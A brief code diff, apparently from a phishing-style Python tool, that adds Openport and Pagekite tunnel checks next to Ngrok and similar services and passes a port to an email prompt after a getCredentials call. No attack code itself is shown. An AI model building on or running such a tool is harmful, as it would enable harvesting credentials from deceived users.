@@ -24,6 +24,8 @@ languageSelector()
 checkConnection()
 checkLocalxpose()
 checkNgrok()
+checkOpenport()
+checkPagekite()
 checkbinaryLT()
 checkLT()
 ifSettingsNotExists()
@@ -50,5 +52,5 @@ if __name__ == "__main__":
         getCredentials(port)
 
     except KeyboardInterrupt:
-        emailPrompt3()
+        emailPrompt3(port)
         exit()
